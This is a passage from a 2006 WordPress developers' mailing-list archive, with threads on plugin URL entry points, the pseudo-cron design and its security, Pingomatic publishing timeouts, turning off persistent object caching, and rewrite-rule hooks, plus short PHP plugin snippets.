I've been writing a couple of new things that use a few complicated 
javascript techniques, and it occurs to me that this is simply not poetry:

class AjaxPlugin {
	function AjaxPlugin () {
		if(defined('ABSPATH')) {
			add_action('wp_header',
			array(&$this, 'wp_header'));
		}
	}
	function solo() {
		// Do things when the plugin file is loaded by
		// itself but that also require WP functions/data
	}
	function include_up() {
		// This function finds a file in
		// progressive parent directories
		return $file_location;
	}
	function wp_header() {
		// Create a reference to this file in a script tag
		echo '<script type="text/javascript" src="'
		. $this->pluginuri . '"></script>';
	}
	function pluginuri() {
		// Return the URI of this file in the plugins dir
		return get_settings('siteurl')
		. '/wp-content/plugins/'
		. plugin_basename(__FILE__);
	}
}
$ajaxplugin = new AjaxPlugin();
if(!defined('ABSPATH')) {
	// Must include wp-config.php at the global scope.
	include($ajaxplugin->include_up('wp-config.php');
	$ajaxplugin->solo();
}


Suggestions for prettier alternatives are welcome.

Owen





From davebytes at comcast.net  Fri Feb  3 15:32:54 2006
From: davebytes at comcast.net (David Chait)
Date: Fri Feb  3 15:34:19 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net><43E301B7.1000408@boren.nu><125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com><800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net><ebe43d680602030302vdbbc3c1n@mail.gmail.com>
	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
Message-ID: <004901c628d7$1d9ac600$6e01a8c0@sixfour>

+1  Given the 'marginal gains', and given that it does absolutely freaky 
things if it is in a bad state (one case was caught, you've hit another), 
object caching should be DISABLED by default, and require enabling by an 
advanced user (given 'average' shared hosting user won't see much of a 
gain -- say compared to the wp-cache factors...).

----- Original Message ----- 
From: "Mark Jaquith" <mark.wordpress@txfx.net>
To: <wp-hackers@lists.automattic.com>
Sent: Friday, February 03, 2006 7:00 AM
Subject: Re: [wp-hackers] Bizarre /cache/ experience with 
wp_object_cache.lock


| On Feb 3, 2006, at 6:02 AM, David House wrote:
|
| > At the moment we have a constant,
| > ENABLE_CACHE, which you can define in wp-config.php to enable the
| > cache even when safe mode is on.
|
| We'll still need an option if we want to automatically disable the
| cache when it isn't working an avoid those 300+ query loads.  The
| average user (a) isn't going to know that 300 queries are being made)
| and (b) probably won't figure out very quickly how to do define
| ('DISABLE_CACHE', true); to revert to the old cache method.
|
| --
| Mark Jaquith
| http://txfx.net/
|
|
| _______________________________________________
| wp-hackers mailing list
| wp-hackers@lists.automattic.com
| http://lists.automattic.com/mailman/listinfo/wp-hackers
| 

From fuzzygroup at gmail.com  Fri Feb  3 15:41:20 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Fri Feb  3 15:42:44 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E3660C.2030604@midnightcircus.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
	<43E28C52.90307@cygnusinteractive.com>
	<43E29E05.1050601@atl.lmco.com>
	<8e1656660602021615m681e970cv7f54a200a90541c2@mail.gmail.com>
	<ebe43d680602030257h7427da9er@mail.gmail.com>
	<43E35F9E.3070001@midnightcircus.com> <43E3601D.80602@skippy.net>
	<43E3660C.2030604@midnightcircus.com>
Message-ID: <8e1656660602030741hf95ffa2r880174f32e02b306@mail.gmail.com>

Another concern about psuedo cron being wgetted from a real cron is its a
wondeful attack vector. The right approach, imho, is to add a "cron
password" or security key which is used only for that and unique per
installation (and hopefully never ever shows up in a google referer log) and
then the wget only works if that's installed and otherwise it simulates a
systems failure (phil greenspun trick for fooling attackers -- don't say
"nah nah nah - you suck you hacker" say "systems error").

so a ui field for setting this, changing it, etc, and for allowing wget
inbound cron traffic.  I'd also recommend that the wp-* .php script not be
called cron since it lets people know what it its.  wp-etc.php or something
else.  Yeah security thru obscrity isn't great but every bit helps.

S

On 2/3/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>
> Scott Merrill wrote:
> > Owen Winkler wrote:
> >> One thing I've advocated is that there be a direct URL in WP-Cron for
> >> wget'ing it from a real cron.  This would allow for reliable execution
> >> that doesn't potentially delay any site output.  It would still work
> the
> >> same way, executing hooks based on preset intervals, but it could be
> >> made to do it more regularly.
> >
> > I asked in #wordpress for details about this awhile back, but I forget
> > if you answered.  Do you want a single "?cron=go" trigger, which merely
> > executes whatever hook is next scheduled to fire; or do you want more
> > granularity ( "?cron=60" or "?cron=15" ) in order to specifically call
> > just the hooks you want?
> >
>
> I think that a "?cron=go" is probably sufficient, as long as the cron is
> executed as frequently as wp-cron needs.
>
> My suggestion would also be to store the last time wp-cron was executed
> via "?cron=go" in options.  Pseudo-cron would not be triggered if the
> option had a time stored for the last "?cron=go" request that was more
> recent than the required minimum duration between cron executions (15
> minutes?).  That way you can avoid a user option for turning off
> pseudo-cron AND have more reliable execution for when cron isn't working
> or is improperly configured, since pseudo-cron would execute if a
> scheduled cron was somehow skipped.
>
> Owen
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From jeff at jrm.cc  Fri Feb  3 16:42:17 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Fri Feb  3 16:43:51 2006
Subject: [wp-hackers] Friendly plugin URL entrypoints?
In-Reply-To: <43E36A13.90102@midnightcircus.com>
References: <43E36A13.90102@midnightcircus.com>
Message-ID: <43E387E9.4060001@jrm.cc>

Owen Winkler wrote:
> Would it be worthwhile to have a dedicated friendly-style URL entry 
> point for plugins?  For example...
> 
> Instead of requesting:
> http://example.com/wp-content/plugins/myplugin/myplugin.php?entrypoint=1
> 
> I could request something like:
> http://example.com/_plugin/myplugin/1
> 
> Suggestions for prettier alternatives are welcome.

I steal the 404 page for this sort of thing.

For example, I can't recall exactly which hook it is (404, page_query, 
something), but when I hook it I do a simple query against the query 
object to see what wordpress tells me the pagename is, then if it's what 
I'm looking for I steal the output right there -- or in some cases, will 
reset portions of the wp_query object to turn the "404" into a 
category/post/page.

-- really short example ---------------------------------------------
add_filter('the_posts', 'catch_the_posts_about');
function catch_the_posts_about($posts) {
   if( $_SERVER['QUERY_STRING'] == 'pagename=myplugin-ajax' ) {
     //jack output
     exit;
   }
   return $posts;
}
-- /really short example --------------------------------------------

Now, this of course spits in the face of what might be a perfectly valid 
URL structure, so I'm not quite sure how to assess damages here, but it 
works really nicely.

Jeff
From ringmaster at midnightcircus.com  Fri Feb  3 17:33:21 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb  3 17:34:00 2006
Subject: [wp-hackers] Friendly plugin URL entrypoints?
In-Reply-To: <43E387E9.4060001@jrm.cc>
References: <43E36A13.90102@midnightcircus.com> <43E387E9.4060001@jrm.cc>
Message-ID: <43E393E1.9040905@midnightcircus.com>

Jeff Minard wrote:
> I steal the 404 page for this sort of thing.

Yeah, I think I have a plugin that does it that way, too.

It's good to know that at least one other person has a plugin that might 
benefit from a standard way to handle these entry points.

Do you think a standard set of functions to handle this (and a standard 
place in a site's URL scheme to house them) would be useful?

Owen


From skippy at skippy.net  Fri Feb  3 19:04:15 2006
From: skippy at skippy.net (Scott Merrill)
Date: Fri Feb  3 19:05:21 2006
Subject: [wp-hackers] pingomatic problem?
Message-ID: <43E3A92F.1050702@skippy.net>

A user of my subscribe2 plugin just emailed me, complaining that any
post to his blog _after_ the first post resulted in a long delay.  If
the user logged out after posting his first item, then logged in again,
his next post would proceed as normal with no delay (but posts after
this would be slow -- lather, rinse, repeat).

This user suspected my subscribe2 plugin, but could not articulate why.
 Diagnosis involved trying to load other admin screens after posting
before going back to Write to post a subsequent item.  This did not
work.  Finally, the user shared the following error with me:

Maximum execution time of 30 seconds exceeded in C:\Inetpub\[website
name]\wp-includes\class-IXR.php on line 513

I had him remove rpc.pingomatic.com from his update services list, and
successive posts went through lickety split.

Is pingomatic employing some sort of throttle to prevent DOS attacks?
If so, is there a published value for the delay between successive posts
that I might point my user toward?  Or can that value be posted here?
Or, is there something else at work?

Thanks!
Scott

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From pete.prodoehl at cygnusinteractive.com  Fri Feb  3 21:02:18 2006
From: pete.prodoehl at cygnusinteractive.com (Pete Prodoehl)
Date: Fri Feb  3 21:03:40 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E29E05.1050601@atl.lmco.com>
References: <43E15349.6060708@boren.nu>
	<43E17050.1010708@midnightcircus.com>	<43E261BB.8000406@gunters.org>	<43E28C52.90307@cygnusinteractive.com>
	<43E29E05.1050601@atl.lmco.com>
Message-ID: <43E3C4DA.7020308@cygnusinteractive.com>

Doug Stewart wrote:
> Pete Prodoehl wrote:
>> Hasn't Drupal had a cron-like thing forever? Any Drupal hackers here? 
>> Would it be worth looking at what they did?
> 
> Yes, they do.  It's called "cron.php" and you (wait for it) set up a 
> cron job to run it at regular intervals.
> 
> Not quite what we're looking for here, IMNSHO.

Yeah, sorry, I was thinking of this:

   http://drupal.org/project/poormanscron

"A module which runs the Drupal cron operations without needing the cron 
application. For every page view, this module checks to see if the last 
cron run was more than 1 hour ago (this period is configurable). If so, 
the cron hooks are executed, and Drupal is happy. These cron hooks fire 
after all HTML is returned to the browser, so the user who kicks off the 
cron jobs should not notice any delay."


Pete

From podz at tamba2.org.uk  Fri Feb  3 21:21:37 2006
From: podz at tamba2.org.uk (Podz)
Date: Fri Feb  3 21:22:39 2006
Subject: [wp-hackers] pingomatic problem?
In-Reply-To: <43E3A92F.1050702@skippy.net>
References: <43E3A92F.1050702@skippy.net>
Message-ID: <43E3C961.4020504@tamba2.org.uk>

Scott Merrill wrote:

> Maximum execution time of 30 seconds exceeded in C:\Inetpub\[website
> name]\wp-includes\class-IXR.php on line 513

I saw this in an error log a few days ago but had no idea what it did.
A while ago when I clicked Publish I started getting white screens but
the post was being published to the blog. No obvious cause and a forum
search showed this was happening back in 1.2.x
I just removed the pingomatic link and made 3 test posts which went
through much faster than my posts had been doing. I also got no white
screen. Put pingomatic back - 15 seconds to publish + white screen.

I know the structure has been changed about the pinging and someone
might say upgrade but someone posted to the forum who is having the same
problem and using 2.0.1 (
http://wordpress.org/support/topic/59516?replies=3#post-319397 )

So if it is pingomatic that would explain the white screens in every
version and the lack of an obvious cause.

P.
From skeltoac at gmail.com  Fri Feb  3 21:24:47 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Fri Feb  3 21:26:12 2006
Subject: [wp-hackers] Friendly plugin URL entrypoints?
In-Reply-To: <43E393E1.9040905@midnightcircus.com>
References: <43E36A13.90102@midnightcircus.com> <43E387E9.4060001@jrm.cc>
	<43E393E1.9040905@midnightcircus.com>
Message-ID: <e6ec604d0602031324nf2e9f10pf4a771c88f2ae9ba@mail.gmail.com>

On 2/3/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
>
> It's good to know that at least one other person has a plugin that might
> benefit from a standard way to handle these entry points.

Have another. I've been toying with a something that modifies rewrite
rules. It doesn't have to be a whole lot of code.

> Do you think a standard set of functions to handle this (and a standard
> place in a site's URL scheme to house them) would be useful?

Depends. How many people will install plugins that need it? Probably
not. If the API is sufficient, it probably won't change.

It sounds to me like you have the beginnings of a great plugin
toolkit. Any plugin distro could include the toolkit or just say it's
required and provide the URL. You'd have to create a spec for
dependent plugin authors, that's all.

Andy
From wp at igeek.info  Fri Feb  3 21:43:09 2006
From: wp at igeek.info (Amit Gupta)
Date: Fri Feb  3 21:44:39 2006
Subject: [wp-hackers] pingomatic problem?
References: <43E3A92F.1050702@skippy.net> <43E3C961.4020504@tamba2.org.uk>
Message-ID: <00a401c6290a$d61d8b30$57ebd4cb@unicorn>

Podz <podz@tamba2.org.uk> wrote:
|  Scott Merrill wrote:
|  > Maximum execution time of 30 seconds exceeded in 
C:\Inetpub\[website
|  > name]\wp-includes\class-IXR.php on line 513
|
|  I saw this in an error log a few days ago but had no idea what it 
did.
|  A while ago when I clicked Publish I started getting white screens 
but
|  the post was being published to the blog. No obvious cause and a 
forum
|  search showed this was happening back in 1.2.x
|  I just removed the pingomatic link and made 3 test posts which went
|  through much faster than my posts had been doing. I also got no white
|  screen. Put pingomatic back - 15 seconds to publish + white screen.

I've been getting connection timeouts on one of my blogs, the post is
published though!! and I've been picking the brains of the host thinking
that its something on my server!! :(

gotta try removing pingomatic from the "update services", though its the
only one there!!

but a reply from one of the guys would be quite cool. matt?

------------
Amit Gupta
http://www.amitgupta.in/
http://igeek.info/  ||  http://blog.igeek.info/
http://blog.igeek.info/wp-plugins/igsyntax-hiliter
From skeltoac at gmail.com  Fri Feb  3 21:47:31 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Fri Feb  3 21:48:51 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E3C4DA.7020308@cygnusinteractive.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
	<43E28C52.90307@cygnusinteractive.com>
	<43E29E05.1050601@atl.lmco.com>
	<43E3C4DA.7020308@cygnusinteractive.com>
Message-ID: <e6ec604d0602031347k39ccfa58n67fcea46d0eed99e@mail.gmail.com>

Hey, let's move discussion of individual 2.next ideas (ahem, cron)
into other threads so that this one can stay on topic.

Any other 2.next development ideas?
From skeltoac at gmail.com  Fri Feb  3 21:51:23 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Fri Feb  3 21:52:44 2006
Subject: [wp-hackers] pingomatic problem?
In-Reply-To: <43E3C961.4020504@tamba2.org.uk>
References: <43E3A92F.1050702@skippy.net> <43E3C961.4020504@tamba2.org.uk>
Message-ID: <e6ec604d0602031351v538eb189teecc7c71f5769662@mail.gmail.com>

On 2/3/06, Podz <podz@tamba2.org.uk> wrote:
> I know the structure has been changed about the pinging and someone
> might say upgrade but someone posted to the forum who is having the same
> problem and using 2.0.1 (
> http://wordpress.org/support/topic/59516?replies=3#post-319397 )

The structure that changed was for pingbacks, trackbacks and enclosures.

The kind you're talking about is related to the generic_ping function,
which I swear I never touched :-)

Andy
From c at kouloumbris.com  Fri Feb  3 22:03:44 2006
From: c at kouloumbris.com (CK)
Date: Fri Feb  3 22:05:12 2006
Subject: [wp-hackers] pingomatic problem?
In-Reply-To: <00a401c6290a$d61d8b30$57ebd4cb@unicorn>
References: <43E3A92F.1050702@skippy.net> <43E3C961.4020504@tamba2.org.uk>
	<00a401c6290a$d61d8b30$57ebd4cb@unicorn>
Message-ID: <331E7BFC-902C-422C-B3C7-3B90A0014FA3@kouloumbris.com>

Hi,

On 3 Feb 2006, at 21:43, Amit Gupta wrote:

> I've been getting connection timeouts on one of my blogs, the post is
> published though!! and I've been picking the brains of the host  
> thinking
> that its something on my server!! :(
>
> gotta try removing pingomatic from the "update services", though  
> its the
> only one there!!


I don't know if this is relevant or not, but it looks like a problem  
I am having. When I am Saving a post or posting a comment into the  
blog, in firefox it asks me to save  the corresponding .php file. In  
Safari i get a white page. On the post part the post has been saved  
but on the comment part it wasn't published and sometimes i have to  
press publish 3 times or more to get the comment on the post.

I didn't try removing pingomatic but, i will do that. It was also  
reported to me by a friend experiencing the same problem commenting  
on my blog.

Constantinos

--
GPG: 0x2502604D
http://kouloumbris.com

"A bus station is where a bus stops. A train station is where a train  
stops. On my desk, I have a workstation?go figure."
~ Steven Wright ~


From pete.prodoehl at cygnusinteractive.com  Fri Feb  3 22:04:15 2006
From: pete.prodoehl at cygnusinteractive.com (Pete Prodoehl)
Date: Fri Feb  3 22:05:37 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E261BB.8000406@gunters.org>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
Message-ID: <43E3D35F.2020401@cygnusinteractive.com>

Dougal Campbell wrote:
> Owen Winkler wrote:
>> Ryan Boren wrote:
>>> What else?
> 
>> * Atom 1.0/Feed Engine.
> 
> +1. Atom 0.3 was deprecated before we released 2.0. We really need to go 
> ahead and add a proper Atom 1.0 feed.

+1 on Atom 1.0, and taking full advantage of what Atom has to offer over 
other feed formats. I'm sure someone from the Atom community would be 
willing to assist with this.

And *please* do Atom enclosures right, not just sticking the code for an 
RSS 2.0 enclosure in there...

Pete

From ryan at boren.nu  Fri Feb  3 23:33:22 2006
From: ryan at boren.nu (Ryan Boren)
Date: Fri Feb  3 23:34:47 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>
	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
Message-ID: <43E3E842.7020803@boren.nu>

Mark Jaquith wrote:
> On Feb 3, 2006, at 6:02 AM, David House wrote:
> 
>> At the moment we have a constant,
>> ENABLE_CACHE, which you can define in wp-config.php to enable the
>> cache even when safe mode is on.
> 
> 
> We'll still need an option if we want to automatically disable the  
> cache when it isn't working an avoid those 300+ query loads.  The  
> average user (a) isn't going to know that 300 queries are being made)  
> and (b) probably won't figure out very quickly how to do define 
> ('DISABLE_CACHE', true); to revert to the old cache method.

You can't really use options from the cache because the cache is loaded 
before everything except wpdb.  You could do a direct SELECT, but 
get_option() is not available.

Maybe we should simply disable persistent caching by default and let 
those who want it and know they can use it turn it on.  I'm getting 
tired of working around safe_mode and all of the other issues.

Ryan
From aaron at technosailor.com  Fri Feb  3 23:37:31 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Fri Feb  3 23:38:51 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <43E3E842.7020803@boren.nu>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<43E301B7.1000408@boren.nu>
	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>
	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>
	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>
	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
	<43E3E842.7020803@boren.nu>
Message-ID: <ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>

>
> You can't really use options from the cache because the cache is loaded
> before everything except wpdb.  You could do a direct SELECT, but
> get_option() is not available.
>
> Maybe we should simply disable persistent caching by default and let
> those who want it and know they can use it turn it on.  I'm getting
> tired of working around safe_mode and all of the other issues.
>
> Ryan
>
>
Hear, hear. I for one have disabled it on all of the blogs I use and/or
maintain because it has given me nothing but headaches. Then, coming from
the perspective of a blogging network that has had a number of server
issues, once you get into moving directories and/or servers it causes more
than the average amount of heartburn.

-aaron
From mark.wordpress at txfx.net  Sat Feb  4 01:51:20 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Feb  4 01:52:45 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <43E3E842.7020803@boren.nu>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>
	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
	<43E3E842.7020803@boren.nu>
Message-ID: <602EBE2F-0C93-4FAF-92E9-035D302297EA@txfx.net>

On Feb 3, 2006, at 6:33 PM, Ryan Boren wrote:

> Maybe we should simply disable persistent caching by default and  
> let those who want it and know they can use it turn it on.  I'm  
> getting tired of working around safe_mode and all of the other issues.

+1

The speed gain isn't huge.  I like that it's there, and that there is  
a system in place for putting in your own systems (Memcached, APC),  
but in the end, it's more trouble than it is worth, having it enabled  
by default.

--
Mark Jaquith
http://txfx.net/


From davebytes at comcast.net  Sat Feb  4 01:56:41 2006
From: davebytes at comcast.net (David Chait)
Date: Sat Feb  4 01:58:04 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com><76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>
	<43E3E842.7020803@boren.nu>
Message-ID: <006601c6292e$3eca0820$6e01a8c0@sixfour>

:) Heh.  I already pointed that out and gave my +1.  Mark's a +2, you make 
it a +3.  Go for it!

-d

----- Original Message ----- 
From: "Ryan Boren" <ryan@boren.nu>
To: <wp-hackers@lists.automattic.com>
Sent: Friday, February 03, 2006 6:33 PM
Subject: Re: [wp-hackers] Bizarre /cache/ experience with 
wp_object_cache.lock


| Maybe we should simply disable persistent caching by default and let
| those who want it and know they can use it turn it on.  I'm getting
| tired of working around safe_mode and all of the other issues. 

From jeff at jrm.cc  Sat Feb  4 03:16:56 2006
From: jeff at jrm.cc (Jeff Minard)
Date: Sat Feb  4 03:18:22 2006
Subject: [wp-hackers] pingomatic problem?
In-Reply-To: <e6ec604d0602031351v538eb189teecc7c71f5769662@mail.gmail.com>
References: <43E3A92F.1050702@skippy.net> <43E3C961.4020504@tamba2.org.uk>
	<e6ec604d0602031351v538eb189teecc7c71f5769662@mail.gmail.com>
Message-ID: <43E41CA8.3070500@jrm.cc>

Andy Skelton wrote:
> The kind you're talking about is related to the generic_ping function,
> which I swear I never touched :-)

Just adding to the fray:

That one was causing me tons of trouble too. I was getting post times of 
30-90 seconds in order to get through that function -- I disabled it for 
what I was doing.

Jeff
From ryan at boren.nu  Sat Feb  4 03:20:49 2006
From: ryan at boren.nu (Ryan Boren)
Date: Sat Feb  4 03:22:11 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <006601c6292e$3eca0820$6e01a8c0@sixfour>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com><76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>
	<006601c6292e$3eca0820$6e01a8c0@sixfour>
Message-ID: <43E41D91.1040301@boren.nu>

David Chait wrote:
> :) Heh.  I already pointed that out and gave my +1.  Mark's a +2, you make 
> it a +3.  Go for it!


http://trac.wordpress.org/changeset/3504


> ----- Original Message ----- 
> From: "Ryan Boren" <ryan@boren.nu>
> To: <wp-hackers@lists.automattic.com>
> Sent: Friday, February 03, 2006 6:33 PM
> Subject: Re: [wp-hackers] Bizarre /cache/ experience with 
> wp_object_cache.lock
> 
> 
> | Maybe we should simply disable persistent caching by default and let
> | those who want it and know they can use it turn it on.  I'm getting
> | tired of working around safe_mode and all of the other issues. 
From powzor at gmail.com  Sat Feb  4 04:44:29 2006
From: powzor at gmail.com (Rob)
Date: Sat Feb  4 04:41:16 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>
	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>
Message-ID: <43E4312D.2040405@robm.me.uk>

I'm trying to hook into the rewrite rules, in order to allow /library/ 
to display my-plugin.php?library=true, but I'm running into some problems.

I'm currently modifying the rewrite rules using Ryan's code from the codex:

------------
function nr_mod_rewrite($wp_rewrite) {
   
    $rules = array(
        'library/?' => 'wp-content/plugins/my-plugin.php?library=true'
    );
   
    $wp_rewrite->rules = $rules + $wp_rewrite->rules;
   
}
add_filter('generate_rewrite_rules', 'nr_mod_rewrite');
------------

but it just displays the index page of the site, entries and all. The 
library/? match is certainly working, since going to /blah/ gives a 404, 
but I discovered that the rewrite will only work if you're rewriting to 
index.php; this works, for example:

------------
$rules = array(
        'library/?' => 'index.php?p=1'
);
------------

...displaying the first post in my blog when you visit /library/. I 
thought then that I could just redirect to "index.php?library=true", and 
then hook into init() to check $_GET['library'] and do what I want if it 
was set, but no dice; it never seems to pass the variable in the query 
string, as var_dump()ing $_GET gives an empty array every time.

I'm totally stumped - either this is totally the wrong way to achieve 
what I want to achieve, or I'm just being inordinately stupid. Can 
anyone help? Is there some easier way of redirecting that I'm totally 
missing?
From mark.wordpress at txfx.net  Sat Feb  4 05:23:51 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Sat Feb  4 05:25:14 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <43E41D91.1040301@boren.nu>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com><76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>
	<006601c6292e$3eca0820$6e01a8c0@sixfour>
	<43E41D91.1040301@boren.nu>
Message-ID: <D170385A-5999-4E76-8F1F-C427A8513CF2@txfx.net>

On Feb 3, 2006, at 10:20 PM, Ryan Boren wrote:

> David Chait wrote:
>> :) Heh.  I already pointed that out and gave my +1.  Mark's a +2,  
>> you make it a +3.  Go for it!
>
>
> http://trac.wordpress.org/changeset/3504

Lines 407 and 408 are redundant... we don't need to bother checking  
safe mode if we're already disabling it by default

> 403  	        if ( ! defined('ENABLE_CACHE') )
> 404 	            return;
> 405 	
> 406 	        // Disable the persistent cache if safe_mode is on.
> 407 	        if ( ini_get('safe_mode') && ! defined('ENABLE_CACHE') )
> 408                     return;

--
Mark Jaquith
http://txfx.net/


From wphackers at jamietalbot.com  Sat Feb  4 05:38:39 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Sat Feb  4 05:40:28 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <43E4312D.2040405@robm.me.uk>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>	<43E301B7.1000408@boren.nu>	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>	<76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>	<43E3E842.7020803@boren.nu>	<ca7320070602031537q4f7e7457gfc442f14a09616e8@mail.gmail.com>
	<43E4312D.2040405@robm.me.uk>
Message-ID: <43E43DDF.40600@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Rob wrote:
> I'm trying to hook into the rewrite rules, in order to allow /library/
> to display my-plugin.php?library=true, but I'm running into some problems.
>  

Rob,

Some people have found this link helpful:

www.fabriziotarizzo.org/cache/query_redirect_rewrite.phps

Don't know if that's code you've already seen?  You probably need to have a rewrite_rules filter
and a query_vars filter.  You can hook into parse_query to check if a variable has been passed (like
library=true, for instance.  You can search this mailing archive for some other people that have had
this problem and some other possible solutions.

As a side note, there seem to be quite a few people having difficulty using the rewrite API at the
moment.  Perhaps this is another area we could look to improve on in 2.1?

Cheers,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD5D3erovxfShShFARAhA9AJ0XQQbRB7t6nfs/RjsXeUT2XpgZAQCeNMdg
YRaPmTqz9sDDFsX76temg/Q=
=AE1t
-----END PGP SIGNATURE-----
From wphackers at jamietalbot.com  Sat Feb  4 05:41:15 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Sat Feb  4 05:42:43 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <D170385A-5999-4E76-8F1F-C427A8513CF2@txfx.net>
